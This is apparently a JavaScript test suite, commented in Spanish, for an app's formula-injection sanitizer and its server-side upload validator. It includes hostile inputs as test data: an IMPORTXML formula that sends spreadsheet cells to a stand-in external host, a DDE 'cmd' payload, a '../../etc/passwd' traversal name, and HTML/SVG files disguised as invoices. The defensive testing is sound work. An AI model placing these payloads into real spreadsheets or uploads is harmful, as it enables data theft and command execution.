// Verificación de las dos defensas que se agregaron en el borde de escritura:
// el saneo de fórmulas (hallazgo 2.4 de AUDITORIA_SEGURIDAD.md) y la validación
// de archivos en el servidor (hallazgo 2.5).
import { test } from "node:test";
import assert from "node:assert/strict";
import { url } from "./raiz.mjs";

const { neutralizarFormula, sanearFilas } = await import(url("lib/domain/sanear.js"));
const { MIME_PERMITIDOS, nombreSeguro, tipoRealDe } = await import(url("lib/domain/archivos.js"));

// ----- Fórmulas ------------------------------------------------------------

test("EL CASO: la fórmula que exfiltra la planilla queda como texto", () => {
  const ataque = '=IMPORTXML("https://ajeno.example/?f="&TEXTJOIN(",",1,A1:Z100), "//a")';
  assert.equal(neutralizarFormula(ataque), "'" + ataque);
});

test("los otros arranques peligrosos también", () => {
  assert.equal(neutralizarFormula("@import"), "'@import");
  assert.equal(neutralizarFormula("+HYPERLINK(...)"), "'+HYPERLINK(...)");
  assert.equal(neutralizarFormula("-Sucursal Norte"), "'-Sucursal Norte");
  assert.equal(neutralizarFormula("=cmd|' /C calc'!A0"), "'=cmd|' /C calc'!A0");
});

test("números y fechas siguen intactos: es lo que USER_ENTERED debe interpretar", () => {
  // Si esto se rompe, un consumo negativo se guarda como texto y deja de sumar.
  for (const v of ["-5", "-1.234,56", "+56 9 8765", "20.440", "31-07-26", "2026-07-31"]) {
    assert.equal(neutralizarFormula(v), v, `cambió ${v}`);
  }
});

test("lo que no es string pasa sin tocar", () => {
  assert.equal(neutralizarFormula(20440), 20440);
  assert.equal(neutralizarFormula(null), null);
  assert.equal(neutralizarFormula(undefined), undefined);
});

test("texto normal no se toca", () => {
  assert.equal(neutralizarFormula("Esval"), "Esval");
  assert.equal(neutralizarFormula(""), "");
});

test("sanearFilas recorre la matriz entera", () => {
  assert.deepEqual(sanearFilas([["=A1", "ok"], ["-3", "=B2"]]), [["'=A1", "ok"], ["-3", "'=B2"]]);
  assert.deepEqual(sanearFilas(null), []);
});

// ----- Archivos ------------------------------------------------------------

const bytes = (...partes) =>
  Buffer.concat(partes.map((p) => (typeof p === "string" ? Buffer.from(p, "latin1") : Buffer.from(p))));

test("reconoce las firmas de lo que la app sube de verdad", () => {
  assert.equal(tipoRealDe(bytes("%PDF-1.7")), "application/pdf");
  assert.equal(tipoRealDe(bytes([0xff, 0xd8, 0xff, 0xe0])), "image/jpeg");
  assert.equal(tipoRealDe(bytes([0x89, 0x50, 0x4e, 0x47])), "image/png");
  assert.equal(tipoRealDe(bytes("RIFF", [0, 0, 0, 0], "WEBP")), "image/webp");
  assert.equal(tipoRealDe(bytes([0, 0, 0, 0x18], "ftypheic")), "image/heic");
  assert.equal(
    tipoRealDe(bytes([0x50, 0x4b, 0x03, 0x04])),
    "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
  );
  assert.equal(tipoRealDe(bytes([0xd0, 0xcf, 0x11, 0xe0])), "application/vnd.ms-excel");
});

test("EL CASO: un HTML o un SVG disfrazado de factura se rechaza", () => {
  // El mimeType lo declaraba el cliente; acá decide el contenido.
  for (const falso of ["<svg xmlns='http://www.w3.org/2000/svg'>", "<!DOCTYPE html><script>", "MZ\u0090"]) {
    const tipo = tipoRealDe(bytes(falso));
    assert.ok(!tipo || !MIME_PERMITIDOS.has(tipo), `pasó ${falso.slice(0, 20)}`);
  }
});

test("el nombre del archivo no puede traer ruta ni control", () => {
  assert.equal(nombreSeguro("../../etc/passwd"), "-..-etc-passwd");
  assert.equal(nombreSeguro("factura\r\n.pdf"), "factura.pdf");
  assert.equal(nombreSeguro(""), "adjunto");
  assert.equal(nombreSeguro(null), "adjunto");
  assert.equal(nombreSeguro("Boleta Esval julio.pdf"), "Boleta Esval julio.pdf");
});
